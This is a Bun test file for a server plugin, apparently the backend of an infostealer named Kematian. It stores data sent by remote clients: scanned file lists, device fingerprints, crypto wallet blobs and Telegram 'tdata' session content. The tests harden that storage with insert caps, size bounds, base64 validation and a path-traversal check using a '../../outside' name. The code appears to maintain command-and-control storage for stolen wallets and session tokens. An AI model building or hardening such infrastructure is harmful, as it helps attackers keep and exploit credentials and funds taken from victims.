import { afterAll, describe, expect, test } from "bun:test";
import { Database } from "bun:sqlite";
import { mkdtempSync, readdirSync, rmSync } from "fs";
import { tmpdir } from "os";
import { dirname, join, resolve, sep } from "path";
import plugin from "./server.src.js";

const dataDir = mkdtempSync(join(tmpdir(), "kematian-security-"));
const db = new Database(":memory:");
const broadcasts = [];
const ctx = {
  db,
  dataDir,
  broadcast(event, payload) {
    broadcasts.push({ event, payload });
  },
};

plugin.setup(ctx);

afterAll(() => {
  db.close();
  rmSync(dataDir, { recursive: true, force: true });
});

describe("agent event storage hardening", () => {
  test("caps insert batches and ignores structurally empty records", () => {
    const files = Array.from({ length: 6000 }, (_, index) => ({
      path: `C:\\capture\\${index}.txt`,
      name: `${index}.txt`,
      size: index,
    }));
    files.push({}, null, "not-an-object");

    plugin.onEvent(ctx, "client-batch", "file_scan_results", { files });

    const count = db.prepare("SELECT COUNT(*) AS n FROM files WHERE client_id = ?")
      .get("client-batch").n;
    expect(count).toBe(5000);

    for (let batch = 1; batch <= 5; batch++) {
      plugin.onEvent(ctx, "client-batch", "file_scan_results", {
        files: Array.from({ length: 5000 }, (_, index) => ({
          path: `C:\\capture\\batch-${batch}-${index}.txt`,
        })),
      });
    }
    const retained = db.prepare("SELECT COUNT(*) AS n FROM files WHERE client_id = ?")
      .get("client-batch").n;
    expect(retained).toBe(25000);
  });

  test("bounds fingerprint JSON before persistence", () => {
    plugin.onEvent(ctx, "client-fingerprint", "fingerprint_result", {
      oversized: "x".repeat(300 * 1024),
    });

    const row = db.prepare("SELECT data FROM fingerprints WHERE client_id = ?")
      .get("client-fingerprint");
    expect(row.data).toBe("{}");
  });

  test("limits disk-backed wallet records per client", () => {
    const content = Buffer.from("bounded blob").toString("base64");
    for (let index = 0; index < 65; index++) {
      plugin.onEvent(ctx, "client-blob", "wallet_auto_data", {
        name: `wallet-${index}`,
        path: `C:\\wallets\\${index}`,
        content,
      });
    }

    const count = db.prepare("SELECT COUNT(*) AS n FROM wallet_data WHERE client_id = ?")
      .get("client-blob").n;
    expect(count).toBe(64);
    expect(readdirSync(join(dataDir, "blobs")).filter(name => name.startsWith("wd_client-blob_")))
      .toHaveLength(64);
  });

  test("rejects malformed base64 without writing a record", () => {
    plugin.onEvent(ctx, "client-invalid-blob", "telegram_data", {
      account: "test",
      path: "tdata",
      content: "not-valid-base64",
    });

    const count = db.prepare("SELECT COUNT(*) AS n FROM telegram_sessions WHERE client_id = ?")
      .get("client-invalid-blob").n;
    expect(count).toBe(0);
  });

  test("keeps hostile blob names inside the plugin data directory", () => {
    plugin.onEvent(ctx, "client-path", "wallet_auto_data", {
      name: "../../outside\\wallet",
      path: "source",
      content: Buffer.from("safe location").toString("base64"),
    });

    const row = db.prepare("SELECT blob_path FROM wallet_data WHERE client_id = ?")
      .get("client-path");
    const blobRoot = resolve(join(dataDir, "blobs"));
    expect(resolve(dirname(row.blob_path)) + sep).toBe(blobRoot + sep);
  });
});
